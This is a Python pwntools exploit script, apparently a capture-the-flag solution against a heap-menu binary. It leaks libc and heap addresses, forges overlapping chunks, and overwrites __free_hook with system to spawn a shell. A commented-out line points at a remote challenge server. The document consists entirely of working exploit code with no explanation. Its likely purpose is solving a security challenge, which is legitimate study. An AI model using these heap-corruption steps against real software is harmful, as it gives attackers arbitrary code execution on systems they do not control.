from pwn import *
#r = remote('47.111.59.243',10001)
r = process('./pwn')
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c'] 

def add(size, name, price):
    r.recvuntil('>>> ')
    r.sendline('1')
    r.recvuntil('Name length: ')
    r.sendline(str(size))
    r.recvuntil('Name: ')
    r.send(name)
    r.recvuntil('Price: ')
    r.sendline(str(price))

def comment(idx, content, score):
    r.recvuntil('>>> ')
    r.sendline('2')
    r.recvuntil('Index: ')
    r.sendline(str(idx))
    r.recvuntil('Comment on')
    r.send(content)
    r.recvuntil('score: ')
    r.sendline(str(score))

def free(idx):
    r.recvuntil('>>> ')
    r.sendline('3')
    r.recvuntil('index: ')
    r.sendline(str(idx))

#leak
add(0x8c,'a'*0x8b+'\n',10)
add(0x8c,'b'*0x8b+'\n',11)
add(0x8c,'c'*0x8b+'\n',12)
free(0)
free(1)
comment(2,'\xff',222)
free(2)
r.recvuntil('ment ')
x = r.recv(4)
libc_addr = u32(x) - 0xf7f5b7ff+ 0xf7daa000
y = r.recv(4)
heap_addr = u32(y) - 0x58cdb0f0 + 0x56cdb000
print(hex(libc_addr))
print(hex(heap_addr))
#gdb.attach(r)
add(0x14c,'\x00'*0x14b+'\n',10)

#shrink
add(0x14,'a'*0x13+'\n',11)
add(0x14,'a'*0x13+'\n',12)
add(0x14,'a'*0x13+'\n',13)
add(0x14,'a'*0x13+'\n',14)
add(0x2c,'b'*0x2b+'\n',15)
free(1)
free(2)
free(3)
free(4)
free(5)
add(0x104,'\x00'*0xf8+p32(0x100)+p32(0)+'\n',11)
add(0x4c,'d'*0x4b+'\n',12)
add(0x1c,'e'*0x1b+'\n',13)
free(1)
add(0x2c, 'b'*0x28+p32(0x30)+'\n',11)
add(0x4c,'f'*0x4b+'\n',14)
add(0x3c,'g'*0x3b+'\n',15)
add(0x2c,'h'*0x2b+'\n',16)
add(0x3c,'h'*0x3b+'\n',17)

free(4)
free(2)

#attack top chunk
free(5)
free(6)
add(0x9c,'a'*0x4c+p32(0x41)+p32(0x31)+'\x00'*0x38+p32(0x31)+p32(libc_addr+0x1b179c)+'\n',12)
add(0x3c,'b'*0x3b+'\n',14)
add(0x2c,'\x00'+'\n',15)
add(0x2c,p32(0)*3+p32(libc_addr+0x1b21e8)+'\n',16)

#__free_hook->system,free_hook('/bin/sh')
free(1)
free(2)
free(3)
free(4)
add(0x1ec,'/bin/sh'+'\x00'+'\n',11)
add(0x1ec, 'aaaa'+'\n',12)
add(0x1ec,'aaaa'+'\n',13)
add(0x1ec, '\x00'*0xbc+p32(0x1)+p32(0x2)+p32(0xf7e1f700)+'\x00'*0x28+p32(libc_addr+0x3b940)+'\n',14)
free(1)
r.interactive()